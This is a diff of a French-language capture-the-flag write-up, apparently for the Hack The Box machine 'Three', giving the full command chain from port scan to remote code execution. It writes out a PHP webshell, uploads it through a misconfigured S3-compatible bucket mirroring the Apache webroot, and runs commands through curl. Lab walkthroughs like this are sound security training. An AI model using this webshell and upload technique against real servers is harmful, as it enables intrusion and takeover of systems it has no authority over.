@@ -1,8 +1,24 @@
 [⬅ Retour à Starting Point](../README.md) · [🏠 Accueil du repo](../../../README.md)
 
-# Machine 9 — THREE
+# Machine 9 — Three
 
 **Stockage S3-compatible synchronisé au webroot — Ports 22, 80**
+
+| | |
+|---|---|
+| **Tier** | 2 |
+| **OS** | Linux |
+| **Services** | SSH (22) · HTTP/Apache (80) · S3-compatible (sous-domaine) |
+
+```mermaid
+flowchart LR
+    A["nmap -sC -sV"] --> B["Apache + PHP<br/>thetoppers.htb"]
+    B --> C["Sous-domaine découvert<br/>s3.thetoppers.htb"]
+    C --> D["awscli + creds factices<br/>aws configure"]
+    D --> E["aws s3 ls<br/>bucket = webroot Apache"]
+    E --> F["Upload shell.php<br/>--acl public-read"]
+    F --> G["curl shell.php?cmd=id<br/>→ RCE"]
+```
 
 ## Concept
 
@@ -10,47 +26,67 @@ Un sous-domaine expose un service compatible Amazon S3, synchronisé avec
 le webroot Apache : un simple upload de fichier suffit à obtenir
 l'exécution de code.
 
-## Méthodologie — commandes complètes
+## Méthodologie
 
-> nmap -sV -sC 10.129.x.x
->
-> \# → 22/tcp SSH, 80/tcp Apache + PHP
->
-> \# Repérer le domaine (section Contact du site) et l'ajouter à
-> /etc/hosts
->
-> sudo nano /etc/hosts
->
-> \# 10.129.x.x thetoppers.htb
->
-> \# Énumération → sous-domaine découvert : s3.thetoppers.htb
->
-> \# 10.129.x.x thetoppers.htb s3.thetoppers.htb
->
-> sudo apt install awscli
->
-> aws configure
->
-> \# AWS Access Key ID: test
->
-> \# AWS Secret Access Key: test
->
-> \# Default region name: us-east-1
->
-> \# Default output format: (vide)
->
-> aws --endpoint=http://s3.thetoppers.htb s3 ls
->
-> \# → bucket "thetoppers.htb" (= webroot Apache)
->
-> echo '\<?php system(\$\_GET\["cmd"\]); ?\>' \> shell.php
->
-> aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php
-> s3://thetoppers.htb/ --acl public-read
->
-> curl "http://thetoppers.htb/shell.php?cmd=id"
->
-> curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
+### Scan de ports
+
+```bash
+nmap -sV -sC 10.129.x.x
+```
+
+```
+22/tcp open  ssh
+80/tcp open  http   Apache + PHP
+```
+
+### Découverte du sous-domaine S3
+
+Le domaine (section Contact du site) est ajouté à `/etc/hosts` :
+
+```bash
+sudo nano /etc/hosts
+# 10.129.x.x thetoppers.htb
+```
+
+L'énumération de sous-domaines révèle `s3.thetoppers.htb` :
+
+```bash
+# 10.129.x.x thetoppers.htb s3.thetoppers.htb
+```
+
+### Connexion au bucket S3
+
+```bash
+sudo apt install awscli
+aws configure
+```
+
+```
+AWS Access Key ID: test
+AWS Secret Access Key: test
+Default region name: us-east-1
+Default output format: (vide)
+```
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+```
+
+→ bucket `thetoppers.htb` (= webroot Apache).
+
+### Upload d'un webshell
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/ --acl public-read
+```
+
+### Exécution de commandes
+
+```bash
+curl "http://thetoppers.htb/shell.php?cmd=id"
+curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt"
+```
 
 Captures d'écran
 
